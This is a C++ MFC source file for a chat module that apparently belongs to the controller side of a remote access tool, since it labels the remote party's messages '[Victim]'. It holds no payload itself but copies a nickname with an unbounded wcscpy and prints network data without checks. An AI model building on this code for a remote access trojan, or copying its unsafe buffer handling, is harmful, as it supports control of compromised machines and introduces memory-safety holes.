#include "stdafx.h"
#include "ChatSrv.h"
#include "ChatInputName.h"
#include "ChatDlg.h"
#include "resource.h"
CChatSrv::CChatSrv(DWORD dwIdentity) :
CEventHandler(dwIdentity)
{
	m_pDlg = NULL;
	memset(m_szNickName, 0, sizeof(m_szNickName));
}


CChatSrv::~CChatSrv()
{
}


void CChatSrv::OnConnect()
{
	CChatInputName dlg;
	dlg.DoModal();
	if (dlg.m_NickName.GetLength() != 0)
	{
		wcscpy(m_szNickName,dlg.m_NickName);
	}
	m_pDlg = new CChatDlg(this);
	if (m_pDlg->Create(IDD_CHAT_DLG,CWnd::GetDesktopWindow()) == FALSE)
	{
		Disconnect();
		return;
	}
	//禁用send button.
	m_pDlg->GetDlgItem(IDOK)->EnableWindow(FALSE);
	m_pDlg->ShowWindow(SW_SHOW);
	//
}

void CChatSrv::OnClose()
{
	if (m_pDlg)
	{
		delete m_pDlg;
		m_pDlg = NULL;
	}
}



void CChatSrv::OnChatInit(DWORD dwRead, char*szBuffer)
{
	DWORD dwStatu = *(DWORD*)szBuffer;
	if (dwStatu)
	{
		//开始聊天
		Send(CHAT_BEGIN, (char*)m_szNickName, sizeof(WCHAR)*((wcslen(m_szNickName)+1)));
		m_pDlg->GetDlgItem(IDOK)->EnableWindow(TRUE);
	}
	else
	{
		Disconnect();
	}
}
void CChatSrv::OnChatMsg(DWORD dwRead, char*szbuffer)
{
	//显示到屏幕上
	CString NewMsg;
	NewMsg.Format(L"[Victim]: %s\r\n", szbuffer);
	m_pDlg->m_MsgList.SetSel(-1);
	m_pDlg->m_MsgList.ReplaceSel(NewMsg);
}

void CChatSrv::OnReadComplete(WORD Event, DWORD Total, DWORD dwRead, char*Buffer)
{
	switch (Event)
	{
	case CHAT_INIT:
		OnChatInit(dwRead, Buffer);
		break;
	case CHAT_MSG:
		OnChatMsg(dwRead, Buffer);
		break;
	default:
		break;
	}
}

void CChatSrv::OnReadPartial(WORD Event, DWORD Total, DWORD dwRead, char*Buffer)
{

}

void CChatSrv::OnWritePartial(WORD Event, DWORD Total, DWORD dwWrite, char*Buffer)
{

}
void CChatSrv::OnWriteComplete(WORD Event, DWORD Total, DWORD dwWrite, char*Buffer)
{

}

void CChatSrv::SendMsg(WCHAR*szMsg)
{
	Send(CHAT_MSG, (char*)szMsg, sizeof(WCHAR)*(wcslen(szMsg) + 1));
}